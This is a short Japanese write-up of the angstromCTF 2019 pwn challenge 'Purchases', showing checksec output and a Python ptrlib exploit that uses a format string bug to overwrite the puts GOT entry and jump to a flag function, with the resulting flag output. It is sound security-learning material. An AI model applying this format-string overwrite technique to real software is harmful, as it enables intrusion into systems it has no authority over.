# [pwn 120pts] Purchases - angstromCTF 2019
64bitでSSPは有効です。
```
$ checksec purchases
[*] 'purchases'
    Arch:	64 bits (little endian)
    NX:		NX enabled
    SSP:	SSP enabled (Canary found)
    RELRO:	Partial RELRO
    PIE:	PIE disabled
```

FSBがあります。
printfの後にはputsがあるので、このGOTを書き換えましょう。
他の問題同様にflag関数があるのでそこへジャンプすればOKです。

```python
from ptrlib import *

elf = ELF("./purchases")
#sock = Process("./purchases")
sock = Socket("shell.actf.co", 19011)

_ = input()
sock.recvuntil("What item would you like to purchase? ")

payload = str2bytes("%{}c%{}$hn".format(0x11b6, 8 + 2))
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(elf.got("puts"))[:3]
sock.sendline(payload)

sock.interactive()
```

`%hn`なので結構出力されます。
```
s$ python solve.py 
[+] Socket: Successfully connected to shell.actf.co:19011
...
...
...
 pAAAA@@ somewhere else. actf{limited_edition_flag}
```

# 感想
64bitのFSBって以外と文献が少ない気がする。
昔初めて見たときは「null入っててできないじゃん！」ってなりました。